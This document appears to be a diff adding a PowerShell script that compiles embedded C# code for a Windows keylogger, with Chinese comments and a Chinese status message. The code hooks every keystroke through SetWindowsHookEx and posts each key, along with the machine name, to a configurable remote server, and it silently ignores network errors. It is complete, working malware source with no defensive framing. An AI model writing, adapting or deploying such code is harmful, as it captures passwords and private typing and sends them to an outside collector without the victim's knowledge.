@@ -1,0 +1,91 @@
+$Signatures = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Net.Http;
+using System.Text;
+
+public class KeyLogger {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    
+    // 【修改点】配置您的服务器接收端 API 地址
+    private static readonly string serverUrl = "http://your-server-ip:5000/log"; 
+    private static readonly HttpClient httpClient = new HttpClient();
+
+    public static void Start() {
+        _hookID = SetHook(_proc);
+    }
+
+    public static void Stop() {
+        UnhookWindowsHookEx(_hookID);
+    }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule) {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            string key = ((System.Windows.Forms.Keys)vkCode).ToString();
+            
+            if (key == "Space") key = " ";
+            else if (key == "Return") key = "\n";
+            else if (key.Length > 1) key = "[" + key + "]";
+            else key = key.ToLower();
+
+            // 异步发送数据到服务器
+            SendToServer(key);
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    private static async void SendToServer(string keyData) {
+        try {
+            // 使用 JSON 格式封装数据
+            var json = "{\"key\": \"" + Uri.EscapeDataString(keyData) + "\", \"computer\": \"" + Environment.MachineName + "\"}";
+            var content = new StringContent(json, Encoding.UTF8, "application/json");
+            await httpClient.PostAsync(serverUrl, content);
+        } catch {
+            // 忽略网络丢包或服务器未响应异常，防止客户端卡顿
+        }
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
+'@
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -TypeDefinition $Signatures -ReferencedAssemblies System.Windows.Forms, System.Net.Http
+
+Write-Host "键盘记录器已启动，正在实时同步至服务器..." -ForegroundColor Green
+
+[KeyLogger]::Start()
+
+try {
+    while ($true) {
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 10
+    }
+} finally {
+    [KeyLogger]::Stop()
+}
